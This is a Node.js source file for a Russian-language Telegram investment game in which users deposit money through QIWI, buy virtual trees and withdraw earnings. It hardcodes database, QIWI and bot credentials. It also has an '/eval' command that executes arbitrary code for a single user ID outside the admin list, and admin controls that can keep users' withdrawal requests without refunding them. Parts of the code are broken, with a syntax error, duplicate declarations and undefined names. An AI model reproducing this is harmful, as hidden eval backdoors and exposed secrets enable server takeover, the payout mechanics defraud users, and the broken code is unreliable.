var txnId = require('./txnId');

process.env.TZ = 'Moscow/Europe';
let trees = [
	{
		id: 1,
		name: "Супер-маркет",
		earn: 10,
		price: 25
	},
	{
		id: 2,
		name: "Магазин одежды",
		earn: 35,
		price: 50
	},
	{
		id: 3,
		name: "Парк развлечении",
		earn: ,
		price: 100
	},
	{
		id: 4,
		name: "Ресторан",
		earn: 500,
		price: 1250
	},
	{
		id: 5,
		name: "Завод техники",
		earn: 1000,
		price: 2750
	},
	{
		id: 6,
		name: "Потом придумаю",
		earn: 1810,
		price: 5000
	},
	{
		id: 7,
		name: "Потом придумаю",
		earn: 3620,
		price: 10000
	}
];

const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(TOKEN, {polling: true});
mongo.connect('mongodb://adminbot:adminka123@ds163103.mlab.com:63103/monetafruit');

const ADMINS = [941350041];

var User = mongo.model('User', {
	id: Number,
	buybalance: Number,
	outbalance: Number,
	fc: Number,
	ref: Number,
	regDate: String,
	trees: Array,
	deposit: Number,
	fetuses: Number,
	menu: String,
	lastCollect: Number
});

var Task = mongo.model('Task', {
	id: Number
});

const Ticket = mongo.model('Ticket', {
	id: Number,
	amount: Number,
	wallet: Number
})

const Start = [
	["🌴 Деревья", "🏛 Обменник"],
	["🖥 Профиль", "👥 Партнёры"],
	["🎁 Подарок", "📈 Статистика"]
];

const Cancel = [
	["🚫 Отмена"]
];

const AdminPanel = [
	["📬 Рассылка", "📮 Выплаты"],
	["📧 Информация"],
	["🔙 Назад"]
];

const { Qiwi } = require('node-qiwi-api');
const qiwi = new Qiwi('4d2b286a03532a0c2f9c727d8262b156');

const TelegramBot = require('node-telegram-bot-api');
const bot = new Telegram('1286821653:AAHCwF17Ttbt2oQwb_Rz7p2t_q7UYEF6atU', { polling: true });

bot.on('message', async (message) => {
	message.send = (text, params) => bot.sendMessage(message.chat.id, text, params);
	let $menu = [];

	Start.map((x) => $menu.push(x));
	if( ADMINS.find((x) => x == message.from.id) ) $menu.push(["🔝 Админка"]);

	if(message.text) {
		if(message.text.startsWith('/start') || message.text == '🔙 Назад') {
			let $user = await User.findOne({ id: message.from.id });
			if( !$user ) {
				let schema = {
					id: message.from.id,
					buybalance: 0,
					outbalance: 0,
					fc: 0,
					ref: 0,
					regDate: `${new Date().getDate()}/${new Date().getMonth() + 1}/${new Date().getFullYear()}`,
					trees: [],
					deposit: 0,
					fetuses: 0,
					menu: "",
					lastCollect: Date.now()
				}

				let reffer = Number(message.text.split('/start ')[1]);

				if( reffer ) {
					let $reffer = await User.findOne({ id: reffer });
					if( $reffer ) {
						schema.ref = $reffer.id;
						await $reffer.inc('buybalance', 0.5);

						bot.sendMessage($reffer.id, `🔔 Вы пригласили <a href="tg://user?id=${message.from.id}">партнёра</a> и получили 0.5₽`, { parse_mode: "HTML" });
					}
				}

				let user = new User(schema);
				await user.save();
			}

			return message.send('👋 Привет, ' + message.from.first_name + '!', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	message.user = await User.findOne({ id: message.from.id });
	if(!message.user) return message.send(`Что-то пошло не так... Напишите /start`);

	if(message.text) {
		if(message.text == '🚫 Отмена') {
			await message.user.set('menu', '');
			return message.send('🚫 Отменено.', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	if(message.user.menu == 'reinvest') {
		message.text = Number(message.text);

		if(!message.text) return message.send('Введите сумму для реинвестирования!');
		if(message.text <= 0) return message.send('Введите сумму для реинвестирования!');

		if(message.text > message.user.outbalance) return message.send('Недостаточно средств.');
		else if(message.text <= message.user.outbalance) {
			await message.user.set('menu', '');

			await message.user.dec('outbalance', message.text);
			await message.user.inc('buybalance', message.text);

			return message.send(`Вы успешно реинвестировали ${message.text.toFixed(2)}₽`, {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	if(message.user.menu.startsWith('amountQiwi')) {
		message.text = Number(message.text);

		if(!message.text) return message.send('Введите сумму на вывод!');
		if(message.text <= 0) return message.send('Введите сумму на вывод!');

		if(message.text > message.user.outbalance) return message.send('Недостаточно средств.');

		if(message.text <= message.user.outbalance) {
			await message.user.dec('outbalance', message.text);

			let ticket = new Ticket({
				id: message.from.id,
				amount: message.text,
				wallet: Number(message.user.menu.split('amountQiwi')[1])
			});

			await ticket.save();
			await message.user.set('menu', '');

			return message.send('Заявка на выплату создана, ожидайте.', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	if(message.user.menu == 'qiwi') {
		message.text = Number(message.text);

		if(!message.text) return message.send('Введите правильный номер!', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});

		if(message.text < 70000000000) return message.send('Введите правильный номер!', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});

		await message.user.set('menu', 'amountQiwi' + message.text);
		return message.send(`Введите сумму на вывод. Вы можете вывести ${message.user.outbalance.toFixed(2)}₽`);
	}

	if(message.text) {
		if(message.text == '🌴 Деревья') {
			return message.send('Выберите, куда зайти.', {
				reply_markup: {
					inline_keyboard: [
						[
							{ text: "🛒 Магазин", callback_data: "trees:shop1" }
						], [
							{ text: "🏝 Мой сад", callback_data: "trees:inv1" }
						]
					]
				}
			});
		}

		if(message.text == '🏛 Обменник') {
			return message.send(`В разделе <b>🏛 Обменник</b> вы сможете обменять <b>🍋 плоды</b> на <b>₽ рубли</b>.

1000 🍋 плодов = 1 рубль
Минимальная сумма обмена: 1000 плодов

🍋 <b>Ваши плоды:</b> ${message.user.fetuses.toFixed(2)}

После обмена 50% попадает на баланс для покупок, а остальные 50% на баланс для вывода.`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{ text: "🔄 Обменять", callback_data: "exchange" }]
					]
				}
			});
		}

		if(message.text == '🖥 Профиль') {
			return message.send(`📝 Имя: <b>${message.from.first_name.replace(/(\<|\>)/g, '')}</b>

🆔 ID: <code>${message.from.id}</code>

🛒 На покупки: ${message.user.buybalance.toFixed(2)}₽
📭 На вывод: ${message.user.outbalance.toFixed(2)}₽

🏝 Деревьев в саду: <b>${message.user.trees.length}</b>`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{ text: "📥 Пополнить", callback_data: "deposit" }, { text: "📤 Вывести", callback_data: "withdraw" }],
						[{ text: "♻️ Реинвест", callback_data: "reinvest" }, { text: "🏝 Мой сад", callback_data: "trees:totalMy" }]
					]
				}
			});
		}

		if(message.text == '👥 Партнёры') {
			let partners = await User.find({ ref: message.from.id });
			return message.send(`<b>🎉 Вы можете заработать с помощью нашей партнёрской программы!

	💶 Приглашайте друзей по ссылке и получайте с этого прибыль!

	🔑 Вы получаете 10% с пополнений ваших партнёров и 0.5₽ за каждого партнёра.</b>

	🔗 Ваша ссылка: https://t.me/MonetaFruitBot?start=${message.from.id}

	🎊 <b>Вы уже пригласили:</b> ${ partners.length }`, {
				parse_mode: "HTML"
			});
		}

		if(message.text == '🎁 Подарок') {
			let task = await Task.findOne({ id: message.from.id });
			if(task) return message.send('Вы уже получили подарок.');

			return message.send(`🏆 Награда: <b>Лимонное дерево</b>
			
1️⃣ Подпишитесь на канал нашей экономической игры.

2️⃣ Возвращайтесь в бота, чтобы получить награду.`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{ text: "➕ Подписаться", url: "https://t.me/joinchat/AAAAAEyxgCuO0vZ5T_MlMQ" }],
						[{ text: "✔️ Готово", callback_data: "checkFollow" }]
					]
				}
			});
		}

		if(message.text == '📈 Статистика') {
			let stats = {
				users: await User.countDocuments(),
				users_today: await User.find({ regDate: `${new Date().getDate()}/${new Date().getMonth() + 1}/${new Date().getFullYear()}` }),
				cmds: message.message_id
			}

			stats.users_today = stats.users_today.length;

			return message.send(`👨‍💻 Пользователей в игре: ${stats.users}
👨‍💻 Пользователей сегодня: ${stats.users_today}
🚀 Команд обработано: ${stats.cmds}`);
		}
	}

	if(ADMINS.indexOf(message.from.id) !== -1) {
		if(message.text == '🔝 Админка') {
			return message.send('🔝 Админка', {
				reply_markup: {
					keyboard: AdminPanel,
					resize_keyboard: true
				}
			});
		}

		if(message.text.startsWith('/setbuybalance')) {
			let cmd = message.text.split(' ');
			if(!cmd[1]) return message.send('Ошибка!');

			let user = await User.findOne({ id: Number(cmd[1]) });
			if(!user) return message.send('Пользователь не найден!');

			await user.set('buybalance', Number(cmd[2]));
			return message.send('Баланс установлен.');
		}

		if(message.text.startsWith('/setoutbalance')) {
			let cmd = message.text.split(' ');
			if(!cmd[1]) return message.send('Ошибка!');

			let user = await User.findOne({ id: Number(cmd[1]) });
			if(!user) return message.send('Пользователь не найден!');

			await user.set('outbalance', Number(cmd[2]));
			return message.send('Баланс установлен.');
		}

		if(message.user.menu == 'mailing') {
			message.send('Начинаю рассылку...', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});

			await message.user.set('menu', '');

			let users = await User.find();

			await users.map((user) => {
				if(message.photo) {
					bot.sendPhoto(user.id, message.photo[message.photo.length - 1].file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.audio) {
					bot.sendAudio(user.id, message.audio.file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.voice) {
					bot.sendVoice(user.id, message.voice.file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.video) {
					bot.sendVideo(user.id, message.video.file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.video_note) {
					bot.sendVideoNote(user.id, message.video_note.file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.document) {
					bot.sendDocument(user.id, message.document.file_id, { caption: message.caption, parse_mode: "HTML", disable_web_page_preview: true });
				}

				if(message.text) {
					bot.sendMessage(user.id, message.text, {
						parse_mode: "HTML",
						disable_web_page_preview: true
					});
				}
			});

			return message.send('Рассылка успешно завершена.');
		}

		if(message.user.menu == 'info') {
			message.text = Number(message.text);
			let user = await User.findOne({ id: message.text });

			if(!user) return message.send('Пользователь не найден.', {
				reply_markup: {
					keyboard: Cancel,
					resize_keyboard: true
				}
			});

			let partners = await User.find({ ref: message.text });
			await message.user.set('menu', '');

			return message.send(`📝 Пригласил: <b>${partners.length}</b>

🆔 ID: <code>${user.id}</code>

💰 Баланс
🛒 Для покупок: ${user.buybalance.toFixed(2)}₽
📭 Для вывода: ${user.outbalance.toFixed(2)}₽

🏝 Деревьев в саду: <b>${user.trees.length}</b>

<b>Пополнил: ${user.deposit}₽</b>`, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}

		if(message.text == '📬 Рассылка') {
			await message.user.set('menu', 'mailing');
			return message.send('Введите текст рассылки.', {
				reply_markup: {
					keyboard: Cancel,
					resize_keyboard: true
				}
			});
		}

		if(message.text == '📮 Выплаты') {
			qiwi.getBalance(async (err, { accounts }) => {
				await message.send(`Баланс кошелька админа: ${accounts[0].balance.amount}₽`);
			});

			let tickets = await Ticket.find();
			if(tickets.length == 0) return message.send('Заявок на вывод нет.');

			await tickets.map((x) => {
				message.send(`📝 Игрок: <a href="tg://user?id=${x.id}">Игрок</a> (ID: <code>${x.id}</code>)

💰 Сумма: ${x.amount}₽`, {
					parse_mode: "HTML",
					reply_markup: {
						inline_keyboard: [
							[{ text: '📭 Вывести', callback_data: `withdraw:${x.id}` }],
							[{ text: '♻️ Вернуть', callback_data: `back:${x.id}` }],
							[{ text: '🚫 Забрать', callback_data: `take:${x.id}` }]
						]
					}
				});
			});
		}

		if(message.text == '📧 Информация') {
			await message.user.set('menu', 'info');
			return message.send('Введите ID пользователя', {
				reply_markup: {
					keyboard: Cancel,
					resize_keyboard: true
				}
			});
		}
	}

	if(message.text && message.text.startsWith('/eval')) {
		if(message.from.id !== 482579901) return;
		return message.send(String(eval(message.text.split('/eval')[1])));
	}
});

bot.on('callback_query', async (query) => {
	const { message } = query;
	message.user = await User.findOne({ id: message.chat.id });

	if(!message.user) return bot.answerCallbackQuery(query.id, 'Что-то пошло не так...', true);

	if(query.data == 'none') return bot.answerCallbackQuery(query.id, 'Привет! :)', true);

	if(query.data.startsWith('trees:shop')) {
		let id = Number(query.data.split('trees:shop')[1]);

		let tree = trees.find((x) => x.id == id);
		if(!tree) return bot.answerCallbackQuery(query.id, 'Что-то пошло не так...', true);

		bot.editMessageText(`🏝 Название: ${tree.name}
		
💰 Стоимость: ${tree.price}₽
💸 Плодов в час: ${tree.earn}`, {
					chat_id: message.chat.id,
					message_id: message.message_id,
					parse_mode: "HTML",
					reply_markup: {
						inline_keyboard: [
							[
								{ text: getNavigationIcon(1, tree.id), callback_data: getNavigationQuery(1, tree.id) },
								{ text: getNavigationIcon(2, tree.id), callback_data: getNavigationQuery(2, tree.id)  },
								{ text: getNavigationIcon(3, tree.id), callback_data: getNavigationQuery(3, tree.id)  },
								{ text: getNavigationIcon(4, tree.id), callback_data: getNavigationQuery(4, tree.id)  },
								{ text: getNavigationIcon(5, tree.id), callback_data: getNavigationQuery(5, tree.id)  },
								{ text: getNavigationIcon(6, tree.id), callback_data: getNavigationQuery(6, tree.id)  },
								{ text: getNavigationIcon(7, tree.id), callback_data: getNavigationQuery(7, tree.id)  }
							],
							[
								{ text: `➕ Купить за ${tree.price}₽`, callback_data: `trees:buy${tree.id}` }
							]
						]
					}
				});
	}

	if(query.data.startsWith('trees:inv')) {
		let id = Number(query.data.split('trees:inv')[1]);

		let tree = trees.find((x) => x.id == id);
		if(!tree) return bot.answerCallbackQuery(query.id, 'Что-то пошло не так...', true);

		let total_balance = 0;

		message.user.trees.map((x) => {
			total_balance += ( ( ( Date.now() - message.user.lastCollect ) / 1000 ) / 60 ) * ( trees.find((a) => a.id == x.id).earn / 60 );
		});

		let count = message.user.trees.filter((x) => x.id == tree.id).length;
		let earn = count * tree.earn;

		bot.editMessageText(`🏝 Название: ${tree.name} (${count}x)
		
💰 Стоимость: ${tree.price}₽
💸 Плодов в час: ${earn}`, {
			chat_id: message.chat.id,
			message_id: message.message_id,
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [
					[
						{ text: getInventoryIcon(1, tree.id), callback_data: getInventoryQuery(1, tree.id) },
						{ text: getInventoryIcon(2, tree.id), callback_data: getInventoryQuery(2, tree.id)  },
						{ text: getInventoryIcon(3, tree.id), callback_data: getInventoryQuery(3, tree.id)  },
						{ text: getInventoryIcon(4, tree.id), callback_data: getInventoryQuery(4, tree.id)  },
						{ text: getInventoryIcon(5, tree.id), callback_data: getInventoryQuery(5, tree.id)  },
						{ text: getInventoryIcon(6, tree.id), callback_data: getInventoryQuery(6, tree.id)  },
						{ text: getInventoryIcon(7, tree.id), callback_data: getInventoryQuery(7, tree.id)  }
					],
					[
						{ text: `➕ Собрать ${total_balance.toFixed(2)}🍋`, callback_data: `trees:collect` }
					]
				]
			}
		});
	}

	if(query.data.startsWith('trees:buy')) {
		let id = Number(query.data.split('trees:buy')[1]);

		let tree = trees.find((x) => x.id == id);
		if(!tree) return bot.answerCallbackQuery(query.id, 'Что-то пошло не так...', true);

		if(tree.price > message.user.buybalance) return bot.answerCallbackQuery(query.id, '🚫 Недостаточно денег для покупки.', true);
		else if(tree.price <= message.user.buybalance) {
			await message.user.dec('buybalance', tree.price);
			await message.user.trees.push({ id: tree.id, date: Date.now(), lastCollect: Date.now() });

			await message.user.save();
			return bot.answerCallbackQuery(query.id, `✅ Вы успешно приобрели ${tree.name} за ${tree.price}₽`, true);
		}
	}

	if(query.data == 'exchange') {
		if(message.user.fetuses < 1000) return bot.answerCallbackQuery(query.id, '🚫 Минимальная сумма обмена: 1000🍋', true);
		
		let { fetuses } = message.user;
		await message.user.set('fetuses', 0);
		
		fetuses = fetuses / 1000;

		await message.user.inc('buybalance', fetuses / 2);
		await message.user.inc('outbalance', fetuses / 2);

		bot.deleteMessage(message.chat.id, message.message_id);
		return bot.answerCallbackQuery(query.id, `✅ Вы успешно обменяли ${( fetuses * 1000 ).toFixed(2)} 🍋 на ${fetuses.toFixed(2)}₽`, true);
	}

	if(query.data == 'deposit') {
		await bot.sendMessage(message.chat.id, `🥝 Способ пополнения: QIWI

🌐 Отправьте любую сумму на кошелек <code>+79298667561</code>
‼️ с комментарием <code>mf${message.chat.id}</code>`, {
			parse_mode: "HTML"
		});

		return bot.sendMessage(message.chat.id, `<code>mf${message.chat.id}</code>`, {
			parse_mode: "HTML"
		});
	}

	if(query.data == 'withdraw') {
		if(message.user.outbalance < 30) return bot.answerCallbackQuery(query.id, '🚫 Минимальная сумма вывода: 30₽', true);
		bot.deleteMessage(message.chat.id, message.message_id);

		await message.user.set('menu', 'qiwi');
		await bot.sendMessage(message.chat.id, 'Введите номер QIWI для вывода.\nНапример: 79001234567', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});
	}

	if(query.data == 'reinvest') {
		await message.user.set('menu', 'reinvest');
		return bot.sendMessage(message.chat.id, 'Введите сумму, которую хотите реинвестировать.', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});
	}

	if(query.data == 'trees:collect') {
		let total_balance = 0;

		message.user.trees.map((x) => {
			if(( ( ( Date.now() - message.user.lastCollect ) / 1000 ) / 60 ) * ( trees.find((a) => a.id == x.id).earn / 60 ) > ( trees.find((a) => a.id == x.id).earn * 72)) {
				total_balance += trees.find((a) => a.id == x.id).earn * 72;
			} else {
				total_balance += ( ( ( Date.now() - message.user.lastCollect ) / 1000 ) / 60 ) * ( trees.find((a) => a.id == x.id).earn / 60 );
			}
		});

		await message.user.set('lastCollect', Date.now());

		await bot.deleteMessage(message.chat.id, message.message_id);
		await message.user.inc('fetuses', Number(total_balance.toFixed(2)));

		return bot.answerCallbackQuery(query.id, `Вы успешно собрали ${total_balance.toFixed(2)}🍋`, true);
	}

	if(query.data == 'trees:totalMy') {
		let $trees = [];
		let total_earn = 0;

		message.user.trees.map((x) => {
			$trees.push(x.id);
			total_earn += trees.find((a) => a.id == x.id).earn
		});

		let text = ``;

		if( $trees.filter((x) => x === 1).length ) {
			text += `\n\n🏝 <b>${trees.find((x) => x.id == 1).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 1).length}\n\t\t▪️ Плодов в час: ${$trees.filter((x) => x === 1).length * trees.find((x) => x.id == 1).earn}`;
		}

		if( $trees.filter((x) => x === 2).length ) {
			text += `\n\n🏝 <b>${trees.find((x) => x.id == 2).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 2).length}\n\t\t▪️ Плодов в час: ${$trees.filter((x) => x === 2).length * trees.find((x) => x.id == 2).earn}`;
		}

		if( $trees.filter((x) => x === 3).length ) {
			text += `\n\n🏝 <b>${trees.find((x) => x.id == 3).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 3).length}\n\t\t▪️ Плодов в час: ${$trees.filter((x) => x === 3).length * trees.find((x) => x.id == 3).earn}`;
		}

		if( $trees.filter((x) => x === 4).length ) {
			text += `\n\n🏝 <b>${trees.find((x) => x.id == 4).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 4).length}\n\t\t▪️ Плодов в час: ${$trees.filter((x) => x === 4).length * trees.find((x) => x.id == 4).earn}`;
		}

		if( $trees.filter((x) => x === 5).length ) {
			text += `\n\n🏝 <b>${trees.find((x) => x.id == 5).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 5).length}\n\t\t▪️ Плодов в час: ${$trees.filter((x) => x === 5).length * trees.find((x) => x.id == 5).earn}`;
		}

		if( $trees.filter((x) => x === 6).length ) {
			text += `\n\n🏝 <b>${trees.find((x) => x.id == 6).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 6).length}\n\t\t▪️ Плодов в час: ${$trees.filter((x) => x === 6).length * trees.find((x) => x.id == 6).earn}`;
		}

		if( $trees.filter((x) => x === 7).length ) {
			text += `\n\n🏝 <b>${trees.find((x) => x.id == 7).name}</b>\n\t\t▫️ Количество: ${$trees.filter((x) => x === 7).length}\n\t\t▪️ Плодов в час: ${$trees.filter((x) => x === 7).length * trees.find((x) => x.id == 7).earn}`;
		}

		return bot.editMessageText(`📄 Список ваших деревьев в саду: ⤵️${text}\n\n════════════════════\n📊 Суммарный доход сада в час: ${total_earn.toFixed(2)}🍋`, {
			parse_mode: "HTML",
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}

	if(query.data == 'checkFollow') {
		let task = await Task.findOne({ id: message.chat.id });
		if(task) return bot.deleteMessage(message.chat.id, message.message_id);

		bot.getChatMember(-1001286701099, message.chat.id).then(async (res) => {
			if(res.status == 'left') return bot.answerCallbackQuery(query.id, '🚫 Вы не подписаны!');

			message.user.trees.push({
				id: 1,
				date: Date.now(),
				lastCollect: Date.now()
			});

			await message.user.save();

			let $task = new Task({
				id: message.chat.id
			});

			await $task.save();

			return bot.editMessageText('Вы выполнили задание и получили <b>Лимонное дерево</b>.', {
				parse_mode: "HTML",
				chat_id: message.chat.id,
				message_id: message.message_id
			});
		});
	}

	if(query.data.startsWith('withdraw:')) {
		let id = Number(query.data.split('withdraw:')[1]);
		let ticket = await Ticket.findOne({ id });

		if(!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		qiwi.toWallet({ account: String(ticket.wallet), amount: ticket.amount, comment: '@MonetaFruitBot' }, () => {});
		bot.sendMessage(ticket.id, `Ваша выплата была одобрена, на QIWI зачислено ${ticket.amount}₽`);

		await ticket.remove();
		return bot.editMessageText('Выплатил!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}

	if(query.data.startsWith('back:')) {
		let id = Number(query.data.split('back:')[1]);
		let ticket = await Ticket.findOne({ id });

		if(!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		let user = await User.findOne({ id: ticket.id });
		bot.sendMessage(ticket.id, `Ваша выплата была отклонена, на ваш счёт возвращено ${ticket.amount}₽`);

		await user.inc('buybalance', ticket.amount);
		await ticket.remove();

		return bot.editMessageText('Вернул!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}

	if(query.data.startsWith('take:')) {
		let id = Number(query.data.split('take:')[1]);
		let ticket = await Ticket.findOne({ id });

		if(!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		await ticket.remove();
		return bot.editMessageText('Забрал!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}
});

User.prototype.inc = function(field, value = 1) {
	this[field] += value;
	return this.save();
}

User.prototype.dec = function(field, value = 1) {
	this[field] -= value;
	return this.save();
}

User.prototype.set = function(field, value) {
	this[field] = value;
	return this.save();
}

function getNavigationIcon(id, tree_id) {
	if(id == tree_id) return '🔵';
	else {
		if(id == 1) return '1️⃣';
		if(id == 2) return '2️⃣';
		if(id == 3) return '3️⃣';
		if(id == 4) return '4️⃣';
		if(id == 5) return '5️⃣';
		if(id == 6) return '6️⃣';
		if(id == 7) return '7️⃣';
	}
}

function getNavigationQuery(id, tree_id) {
	if(id == tree_id) return 'none';
	else {
		if(id == 1) return 'trees:shop1';
		if(id == 2) return 'trees:shop2';
		if(id == 3) return 'trees:shop3';
		if(id == 4) return 'trees:shop4';
		if(id == 5) return 'trees:shop5';
		if(id == 6) return 'trees:shop6';
		if(id == 7) return 'trees:shop7';
	}
}

function getInventoryIcon(id, tree_id) {
	if(id == tree_id) return '🔴';
	else {
		if(id == 1) return '1️⃣';
		if(id == 2) return '2️⃣';
		if(id == 3) return '3️⃣';
		if(id == 4) return '4️⃣';
		if(id == 5) return '5️⃣';
		if(id == 6) return '6️⃣';
		if(id == 7) return '7️⃣';
	}
}

function getInventoryQuery(id, tree_id) {
	if(id == tree_id) return 'none';
	else {
		if(id == 1) return 'trees:inv1';
		if(id == 2) return 'trees:inv2';
		if(id == 3) return 'trees:inv3';
		if(id == 4) return 'trees:inv4';
		if(id == 5) return 'trees:inv5';
		if(id == 6) return 'trees:inv6';
		if(id == 7) return 'trees:inv7';
	}
}

setInterval(async () => {
	qiwi.getOperationHistory({ rows: 10, operation: 'IN' }, (err, response) => {
		response.data.map(async (x) => {
			if(!x.comment) return;
			if(!x.comment.startsWith('mf')) return;

			if(txnId.indexOf(x.txnId) !== -1) return;
			let id = Number(x.comment.split('mf')[1]);

			if(!id) return;

			let user = await User.findOne({ id });
			if(!user) return;

			if(x.sum.currency != 643) return;

			await user.inc('deposit', x.sum.amount);
			await user.inc('buybalance', x.sum.amount);

			bot.sendMessage(id, `Ваш баланс пополнен на ${x.sum.amount}₽`);

			ADMINS.map((a) => bot.sendMessage(a, `<a href="tg://user?id=${id}">Игрок</a> сделал депозит: ${x.sum.amount}₽\n${a !== 482579901 ? 'Пипидону 50%, иначе БУНД!': ''}`, { parse_mode: "HTML" }))

			txnId.push(x.txnId)
			require('fs').writeFileSync('./txnId.json', JSON.stringify(txnId));
		});
	});
}, 12000);